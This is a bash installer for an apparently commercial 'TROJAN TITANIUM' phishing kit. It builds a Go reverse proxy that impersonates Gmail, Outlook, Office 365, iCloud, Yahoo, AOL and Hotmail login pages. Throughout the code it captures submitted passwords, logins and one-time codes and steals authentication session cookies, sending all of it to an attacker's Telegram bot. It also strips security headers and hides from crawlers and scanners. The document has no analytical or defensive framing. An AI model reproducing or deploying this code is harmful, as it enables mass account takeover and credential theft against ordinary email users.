#!/bin/bash
# 🏛️ TROJAN - TITANIUM V18.9 - CONTENT-LENGTH VALIDATED
# --------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

show_header() {
    clear
    echo -e "${BLUE}  ████████╗██████╗  ██████╗       ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
    echo -e "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
    echo -e "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
    echo -e "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
    echo -e "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
    echo -e "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝${NC}"
}

# --- 1. SYSTEM PRE-FLIGHT ---
show_header
echo -e "${CYAN}[...] Scanning Port 80/443 for Conflicts...${NC}"
mkdir -p /root/TrojanProject
sudo fuser -k 80/tcp 443/tcp &> /dev/null
DEPS=(curl dig jq ufw git wget)
for dep in "${DEPS[@]}"; do
    command -v $dep &> /dev/null || sudo apt-get install -y $dep &> /dev/null
done

# --- 2. MASTER LICENSE GATE ---
MASTER_KEY="TROJAN-PRO-2026"
read -p "ENTER MASTER LICENSE KEY: " USER_KEY
[[ $(echo "$USER_KEY" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]') != "$MASTER_KEY" ]] && { echo -e "${RED}[!] ACCESS DENIED${NC}"; exit 1; }

# --- 3. CLOUDFLARE TOKEN VERIFICATION ---
while true; do
    read -p "Enter Cloudflare API Token: " CF_TOKEN
    VERIFY=$(curl -s -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" \
         -H "Authorization: Bearer $CF_TOKEN" \
         -H "Content-Type:application/json")
    if [[ "$VERIFY" == *"\"status\":\"active\""* ]]; then
        echo -e "${GREEN}[success] Cloudflare Token Active.${NC}"
        break
    else
        echo -e "${RED}[error] Cloudflare Token Rejected. Please check permissions.${NC}"
    fi
done

# --- 4. TELEGRAM TOKEN VERIFICATION ---
while true; do
    read -p "Enter Telegram Bot Token: " TG_TOKEN
    [[ $(curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe") == *"\"ok\":true"* ]] && break || echo -e "${RED}[error] Telegram Bot Offline or Token Invalid.${NC}"
done
read -p "Enter Telegram Chat ID: " TG_ID
echo -e "${GREEN}[success] Telegram Exfiltration Verified.${NC}"

# --- 5. DOMAIN & SSL STATUS ---
VPS_IP=$(curl -s https://api.ipify.org)
while true; do
    read -p "Enter Base Domain: " USER_DOMAIN
    DNS_CHECK=$(dig +short $USER_DOMAIN | tail -n1)
    if [[ "$DNS_CHECK" == "$VPS_IP" ]]; then
        echo -e "${GREEN}***************************************${NC}"
        echo -e "${GREEN}* SSL AUTO-GENERATE STATUS: READY    *${NC}"
        echo -e "${GREEN}* DOMAIN: $USER_DOMAIN    *${NC}"
        echo -e "${GREEN}***************************************${NC}"
        break
    else
        echo -e "${RED}[error] DNS Mismatch. Point $USER_DOMAIN to $VPS_IP.${NC}"
    fi
done

# --- 6. SELF-HEALING ENGINE (AIRTIGHT HOST-ENFORCEMENT) ---
echo -e "${CYAN}[...] Rebuilding Airtight Proxy Engine...${NC}"

# A. main.go (SSL for all 7 Lures)
cat << EOF > /root/TrojanProject/main.go
package main
import (
	"fmt"
	"net/http"
	"github.com/caddyserver/certmagic"
)
func main() {
	base := "$USER_DOMAIN"
	fmt.Println("\033[1;35m🏛️  TROJAN TITANIUM ENGINE v18.9\033[0m")
	certmagic.DefaultACME.Agreed = true
	certmagic.DefaultACME.Email = "admin@" + base
	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if IsBot(r) { http.NotFound(w, r); return }
		target := GetTargetConfig(r.Host)
		ProxyTarget(target, w, r)
	})
	domains := []string{base, "gmail."+base, "outlook."+base, "office."+base, "icloud."+base, "yahoo."+base, "aol."+base, "hotmail."+base}
	certmagic.HTTPS(domains, mux)
}
EOF

# B. proxy.go (Airtight Host-Enforcement with Content-Length Validator)
cat << 'EOF' > /root/TrojanProject/proxy.go
package main
import (
	"bytes"
	"io"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strings"
	"fmt"
)
func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
	remote, _ := url.Parse("https://" + t.BaseDomain)
	proxy := httputil.NewSingleHostReverseProxy(remote)
	myHost := r.Host 

	r.Host = remote.Host
	r.URL.Host = remote.Host
	r.URL.Scheme = remote.Scheme
	r.Header.Set("X-Forwarded-Host", myHost)
	r.Header.Set("X-Real-IP", r.RemoteAddr)

	if r.Method == "POST" {
		body, _ := io.ReadAll(r.Body)
		r.Body = io.NopCloser(bytes.NewBuffer(body))
		bodyStr := string(body)
		if strings.Contains(bodyStr, "passwd") || strings.Contains(bodyStr, "login") || strings.Contains(bodyStr, "otp") {
			SendToTelegram(fmt.Sprintf("🔓 [LOGIN] %s\nData: %s", t.Name, bodyStr))
		}
	}

	proxy.ModifyResponse = func(resp *http.Response) error {
		for header, values := range resp.Header {
			for i, v := range values {
				if strings.Contains(strings.ToLower(v), strings.ToLower(t.BaseDomain)) {
					resp.Header[header][i] = strings.ReplaceAll(v, t.BaseDomain, myHost)
				}
				if strings.Contains(v, "login.microsoftonline.com") {
					resp.Header[header][i] = strings.ReplaceAll(v, "login.microsoftonline.com", myHost)
				}
			}
		}

		for _, c := range resp.Cookies() {
			for _, auth := range t.AuthCookies {
				if strings.Contains(c.Name, auth) {
					SendToTelegram(fmt.Sprintf("🎯 [%s] SUCCESS! %s=%s", t.Name, c.Name, c.Value))
					resp.Header.Set("Location", "https://www.google.com/docs/about/")
					resp.StatusCode = 302
					return nil
				}
			}
		}

		resp.Header.Del("Content-Security-Policy")
		resp.Header.Del("X-Frame-Options")
		resp.Header.Del("X-Content-Type-Options")
		resp.Header.Del("Strict-Transport-Security")

		contentType := resp.Header.Get("Content-Type")
		if strings.Contains(contentType, "text") || strings.Contains(contentType, "javascript") || strings.Contains(contentType, "json") {
			oldBody, _ := io.ReadAll(resp.Body)
			bodyStr := string(oldBody)
			
			newContent := strings.ReplaceAll(bodyStr, t.BaseDomain, myHost)
			newContent = strings.ReplaceAll(newContent, "login.microsoftonline.com", myHost)
			newContent = strings.ReplaceAll(newContent, "www.icloud.com", myHost)
			
			// --- CONTENT-LENGTH VALIDATOR ---
			bodyBytes := []byte(newContent)
			resp.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))
			resp.ContentLength = int64(len(bodyBytes))
			resp.Header.Set("Content-Length", fmt.Sprint(len(bodyBytes)))
		}
		return nil
	}
	proxy.ServeHTTP(w, r)
}
EOF

# C. targets.go
cat << 'EOF' > /root/TrojanProject/targets.go
package main
import "strings"
type Target struct { Name, BaseDomain string; AuthCookies []string }
func GetTargetConfig(host string) *Target {
	host = strings.ToLower(host)
	targets := map[string]*Target{
		"gmail":   {"Gmail", "accounts.google.com", []string{"SID", "HSID", "SSID"}},
		"outlook": {"Outlook", "login.live.com", []string{"MSPAuth"}},
		"office":  {"Office", "login.microsoftonline.com", []string{"ESTSAUTH"}},
		"icloud":  {"iCloud", "www.icloud.com", []string{"session_token"}},
		"yahoo":   {"Yahoo", "login.yahoo.com", []string{"B", "T"}},
		"aol":     {"AOL", "login.aol.com", []string{"B", "T"}},
		"hotmail": {"Hotmail", "login.live.com", []string{"MSPAuth"}},
	}
	for k, v := range targets { if strings.Contains(host, k) { return v } }
	return targets["office"]
}
EOF

# --- 7. FINAL BUILD & DEPLOY ---
cat << EOF > /root/TrojanProject/telegram.go
package main
import ("net/http"; "net/url")
func SendToTelegram(text string) {
	token := "$TG_TOKEN"
	chatID := "$TG_ID"
	apiURL := "https://api.telegram.org/bot" + token + "/sendMessage"
	http.PostForm(apiURL, url.Values{"chat_id": {chatID}, "text": {text}})
}
EOF

cat << 'EOF' > /root/TrojanProject/gatekeeper.go
package main
import ("net/http"; "strings")
func IsBot(r *http.Request) bool {
	ua := strings.ToLower(r.Header.Get("User-Agent"))
	botSigs := []string{"bot", "crawler", "spider", "scan", "python", "curl"}
	for _, sig := range botSigs { if strings.Contains(ua, sig) { return true } }
	return ua == ""
}
EOF

cd /root/TrojanProject
export PATH=$PATH:/usr/local/go/bin
go mod tidy &> /dev/null
go get github.com/caddyserver/certmagic &> /dev/null
go build -o TrojanTerminal main.go proxy.go targets.go telegram.go gatekeeper.go
chmod +x TrojanTerminal

cat << 'EOF' > /root/run.sh
#!/bin/bash
clear
DOMAIN=$(cat /root/TrojanProject/main.go | grep 'base :=' | cut -d'"' -f2)
echo -e "\033[1;34m╔══════════════════════════════════════════════════════════════════╗\033[0m"
echo -e "\033[1;34m║\033[0m   \033[1;36mTROJAN GHOST TERMINAL\033[0m   | \033[1;35mSSL: ACTIVE\033[0m | \033[1;32mSTATUS: ONLINE\033[0m       \033[1;34m║\033[0m"
echo -e "\033[1;34m╠══════════════════════════════════════════════════════════════════╣\033[0m"
echo -e "\033[1;34m║\033[0m 01 | Gmail     | https://gmail.$DOMAIN                          \033[1;34m║\033[0m"
echo -e "\033[1;34m║\033[0m 02 | Outlook   | https://outlook.$DOMAIN                        \033[1;34m║\033[0m"
echo -e "\033[1;34m║\033[0m 03 | Office365 | https://office.$DOMAIN                         \033[1;34m║\033[0m"
echo -e "\033[1;34m║\033[0m 04 | iCloud    | https://icloud.$DOMAIN                         \033[1;34m║\033[0m"
echo -e "\033[1;34m║\033[0m 05 | Yahoo     | https://yahoo.$DOMAIN                          \033[1;34m║\033[0m"
echo -e "\033[1;34m║\033[0m 06 | AOL       | https://aol.$DOMAIN                            \033[1;34m║\033[0m"
echo -e "\033[1;34m║\033[0m 07 | Hotmail   | https://hotmail.$DOMAIN                        \033[1;34m║\033[0m"
echo -e "\033[1;34m╚══════════════════════════════════════════════════════════════════╝\033[0m"
sudo fuser -k 80/tcp 443/tcp 2>/dev/null
cd /root/TrojanProject && ./TrojanTerminal
EOF
chmod +x /root/run.sh
sudo ln -sf /root/run.sh /usr/local/bin/Run

echo -e "${GREEN}[success] Build Complete. Type 'Run' to start.${NC}"
